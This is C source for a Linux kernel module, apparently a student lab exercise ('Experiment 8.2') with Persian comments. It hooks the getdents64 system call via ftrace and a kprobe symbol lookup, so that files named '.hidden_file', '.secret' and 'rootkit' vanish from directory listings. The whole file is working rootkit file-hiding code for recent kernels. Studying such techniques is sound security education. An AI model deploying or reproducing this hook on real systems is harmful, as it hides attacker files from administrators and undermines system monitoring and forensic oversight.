#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <asm/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Hook getdents64 via ftrace - Experiment 8.2 - Kernel 6.1.159");

/* فایل‌هایی که پنهان می‌شوند */
static const char *hidden_files[] = {
    ".hidden_file",
    ".secret",
    "rootkit",
    NULL
};

static int should_hide(const char *name)
{
    int i;
    if (!name)
        return 0;
    for (i = 0; hidden_files[i] != NULL; i++) {
        if (strcmp(name, hidden_files[i]) == 0)
            return 1;
    }
    return 0;
}

/* ساختار ftrace hook */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

/* پیدا کردن آدرس تابع با kprobe */
static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0)
        return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/* callback برای ftrace */
static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

/* نصب hook */
static int install_hook(struct ftrace_hook *hook)
{
    int ret;

    hook->address = lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "[-] Could not find %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (ret) {
        printk(KERN_ERR "[-] ftrace_set_filter_ip failed: %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&hook->ops);
    if (ret) {
        printk(KERN_ERR "[-] register_ftrace_function failed: %d\n", ret);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return ret;
    }

    return 0;
}

/* حذف hook */
static void remove_hook(struct ftrace_hook *hook)
{
    int ret;

    ret = unregister_ftrace_function(&hook->ops);
    if (ret)
        printk(KERN_ERR "[-] unregister_ftrace_function failed: %d\n", ret);

    ret = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (ret)
        printk(KERN_ERR "[-] ftrace_set_filter_ip remove failed: %d\n", ret);
}

/* تابع اصلی getdents64 */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

/* تابع hook شده */
static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    long ret;
    char *buf = NULL;
    long offset;
    struct linux_dirent64 *d;
    long remaining;

    dirent = (struct linux_dirent64 __user *)regs->si;

    /* فراخوانی اصلی */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    /* تخصیص buffer */
    buf = kzalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    /* کپی از userspace */
    if (copy_from_user(buf, dirent, ret)) {
        kfree(buf);
        return ret;
    }

    /* فیلتر کردن */
    offset = 0;
    while (offset < ret) {
        d = (struct linux_dirent64 *)(buf + offset);

        if (d->d_reclen == 0)
            break;

        if (should_hide(d->d_name)) {
            printk(KERN_INFO "[EXP8.2] Hiding: %s\n", d->d_name);
            remaining = ret - offset - d->d_reclen;
            if (remaining > 0)
                memmove(buf + offset,
                        buf + offset + d->d_reclen,
                        remaining);
            ret -= d->d_reclen;
            continue;
        }
        offset += d->d_reclen;
    }

    /* بازنویسی نتیجه */
    if (copy_to_user(dirent, buf, ret))
        printk(KERN_ERR "[-] copy_to_user failed\n");

    kfree(buf);
    return ret;
}

/* تعریف hook */
static struct ftrace_hook getdents64_hook = {
    .name     = "__x64_sys_getdents64",
    .function = hooked_getdents64,
    .original = &orig_getdents64,
};

static int __init hook_init(void)
{
    int ret;

    printk(KERN_INFO "[+] Experiment 8.2: Loading (ftrace method)...\n");

    ret = install_hook(&getdents64_hook);
    if (ret) {
        printk(KERN_ERR "[-] Failed to install hook\n");
        return ret;
    }

    printk(KERN_INFO "[+] getdents64 hooked via ftrace!\n");
    printk(KERN_INFO "[+] Hidden: .hidden_file, .secret, rootkit\n");

    return 0;
}

static void __exit hook_exit(void)
{
    remove_hook(&getdents64_hook);
    printk(KERN_INFO "[+] getdents64 restored\n");
    printk(KERN_INFO "[-] Experiment 8.2: Unloaded\n");
}

module_init(hook_init);
module_exit(hook_exit);
